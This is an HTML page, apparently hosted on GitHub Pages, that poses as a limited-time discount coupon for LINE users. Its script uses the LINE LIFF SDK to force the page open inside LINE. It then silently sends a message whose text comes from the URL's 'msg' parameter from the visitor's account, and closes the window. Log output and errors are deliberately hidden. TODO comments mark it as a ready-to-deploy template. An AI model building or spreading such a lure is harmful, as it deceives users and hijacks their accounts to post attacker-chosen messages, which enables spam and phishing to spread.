<!doctype html>
<html lang="zh-Hant">
<head>
  <meta charset="utf-8">
  <title>折價券－連結</title>

  <!-- ====== Open Graph（決定貼連結時的預覽卡片）====== -->
  <!-- TODO-1: 換成你想顯示的標題/描述 -->
  <meta property="og:title" content="限時折價券！點我領取 88 折好康">
  <meta property="og:description" content="點開自動領取優惠，限時 3 天！先搶先贏！">

  <!-- TODO-2: 換成這個頁面的「最終公開 URL」（部署後實際網址） -->
  <meta property="og:url" content="https://devel99301-arch.github.io/onsaletime/index.html">
  <meta property="og:type" content="website">

  <!-- TODO-3: 換成你自己可公開讀取的 HTTPS 圖片（建議 1200×630） -->
  <meta property="og:image" content="https://devel99301-arch.github.io/onsaletime/serve.jpg">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:alt" content="折價券活動預覽圖">

  <!--（可選）Twitter Card，同步 OGP 即可 -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="限時折價券！點我領取 88 折好康">
  <meta name="twitter:description" content="點開自動領取優惠，限時 3 天！先搶先贏！">
  <meta name="twitter:image" content="https://devel99301-arch.github.io/onsaletime/serve.jpg">

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    /* 靜默模式：不顯示任何提示文字 */
    #log { display:none !important; }
    body { margin:0; }
  </style>
</head>
<body>
  <div id="log">初始化中…</div>

  <!-- LIFF SDK -->
  <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
  <script>
  (async () => {
    try {
      const LIFF_ID = "2008019441-GRwnZZ32"; // 大小寫要完全一致
      await liff.init({ liffId: LIFF_ID });

      // 不在 LINE 內就導回 LINE 開啟（讓 sendMessages 可用）
      if (!liff.isInClient()) {
        location.href = "line://app/" + LIFF_ID + location.search;
        return;
      }

      // 讀取 ?msg= 查詢參數（沒有就用預設）
      const sp  = new URL(location.href).searchParams;
      const msg = decodeURIComponent(sp.get("msg") || "我好");

      // 靜默送出訊息，不顯示任何 log
      await liff.sendMessages([{ type: "text", text: msg }]);

      // 關閉視窗
      try { liff.closeWindow(); } catch {}
    } catch (e) {
      // 也不顯示錯誤，完全靜默；若你要偵錯再暫時打開 console
      // console.error(e);
    }
  })();
  </script>
</body>
</html>

